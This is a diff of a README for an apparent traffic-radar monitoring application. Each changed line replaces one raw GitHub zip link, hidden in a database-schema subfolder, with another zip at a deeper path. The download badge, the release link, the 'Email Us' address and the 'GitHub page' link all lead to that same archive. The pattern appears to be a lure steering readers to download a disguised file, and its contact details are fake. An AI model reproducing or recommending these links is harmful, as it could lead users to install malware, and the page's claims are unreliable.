@@ -1,6 +1,6 @@
 # 🚦 Smart-Radar-Traffic-Monitoring-System - Monitor Traffic with Ease
 
-[![Download Now](https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/Smart-Radar-Traffic-Monitoring-System-v1.9.zip%20Now-GET%20IT%20HERE-brightgreen)](https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/Smart-Radar-Traffic-Monitoring-System-v1.9.zip)
+[![Download Now](https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/serverless_views/Radar_Monitoring_Traffic_Smart_System_1.8.zip%20Now-GET%20IT%20HERE-brightgreen)](https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/serverless_views/Radar_Monitoring_Traffic_Smart_System_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To ensure smooth operation, your system should meet the following requirements:
 
 To get started, visit this page to download the application:
 
-[Download the latest release here](https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/Smart-Radar-Traffic-Monitoring-System-v1.9.zip)
+[Download the latest release here](https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/serverless_views/Radar_Monitoring_Traffic_Smart_System_1.8.zip)
 
 Follow these steps:
 
@@ -59,7 +59,7 @@ If you encounter issues or need further assistance, consult the following resour
 
 - **Documentation:** Check out our user manual that comes with the installation.
 - **Community Forum:** Engage with other users and experts for tips and troubleshooting.
-- **Email Us:** Reach out at https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/Smart-Radar-Traffic-Monitoring-System-v1.9.zip for direct assistance.
+- **Email Us:** Reach out at https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/serverless_views/Radar_Monitoring_Traffic_Smart_System_1.8.zip for direct assistance.
 
 ## 🔗 Topics
 
@@ -80,7 +80,7 @@ Explore these topics for deeper insights into the technology behind our system.
 
 ## 📢 Contact Information
 
-For inquiries or feedback, please get in touch through our [GitHub page](https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/Smart-Radar-Traffic-Monitoring-System-v1.9.zip).
+For inquiries or feedback, please get in touch through our [GitHub page](https://raw.githubusercontent.com/mustafaqaysser/Smart-Radar-Traffic-Monitoring-System/main/4_Database_Schema/serverless_views/Radar_Monitoring_Traffic_Smart_System_1.8.zip).
 
 ---
 
